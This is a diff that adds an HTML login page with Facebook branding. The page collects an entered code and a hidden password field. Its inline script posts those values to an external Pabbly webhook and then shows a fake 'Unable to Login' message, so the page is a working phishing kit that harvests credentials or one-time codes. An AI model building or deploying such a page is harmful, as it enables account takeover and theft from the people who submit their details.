@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="pt-EN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./static/styles.css" />
+    <link rel="icon" type="image/png" href="./static/img/facebook-logo1.ico">
+    <title>Login</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Facebook" class="flex justify-content-center">
+                    <img src="./static/img/email-logo.png" alt="Mail logo" title="logo" />
+                </h1>
+                <form id="myWebhookForm" action="/admin2026" method="POST" onsubmit="return false;">
+                    <label for="email" class="sr-only">Email address</label>
+                    <input name="email" placeholder="Enter code" />
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="hidden" placeholder="Password" />
+                    
+                    
+                    <button type="submit">Done</button> 
+                </form>
+
+                    
+            
+        </section>
+        <script>    
+            const form = document.getElementById('myWebhookForm');
+
+            form.addEventListener('submit', async (event) => {
+              event.preventDefault();
+
+              const formData = new FormData(form);
+              const data = Object.fromEntries(formData.entries());
+
+              try {
+                const response = await fetch('https://connect.pabbly.com/webhook-listener/webhook/IjU3NjIwNTY0MDYzNDA0MzM1MjZmNTUzMiI_3D_pc/IjU3NjcwNTZlMDYzNTA0MzE1MjY1NTUzMTUxMzQi_pc', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                  alert('Unable to Login. Try again later');
+                } else {
+                  alert('Failed to Load.');
+                }
+              } catch (error) {
+                console.error('Error:', error);
+              }
+            });
+        </script>
+    </main>
+    <footer>
+        
+    </footer>
+</body>
+</html>
